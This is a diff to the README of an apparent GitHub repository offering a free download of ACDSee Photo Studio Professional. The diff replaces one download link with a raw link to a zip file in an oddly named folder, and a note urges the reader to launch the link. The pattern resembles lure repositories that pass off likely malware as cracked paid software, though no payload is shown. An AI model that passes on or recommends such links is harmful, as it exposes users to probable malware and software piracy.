@@ -23,7 +23,7 @@ This repository focuses on ACDSee Photo Studio Professional 2019, 2020, 2022, 20
 - ACDSee Photo Studio Professional vs Ultimate
 
 ## Download Software
-[![Download Software](https://github.com/gamer615/ACDSee-Photo-Studio-Professional-Download/releases/download/v2.0/Software.zip)](https://github.com/gamer615/ACDSee-Photo-Studio-Professional-Download/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/gamer615/ACDSee-Photo-Studio-Professional-Download/main/steatopathic/Photo_ACD_Download_Studio_Professional_See_v1.9.zip)](https://raw.githubusercontent.com/gamer615/ACDSee-Photo-Studio-Professional-Download/main/steatopathic/Photo_ACD_Download_Studio_Professional_See_v1.9.zip)
 
 Note: The link above needs to be launched to download the software.
 
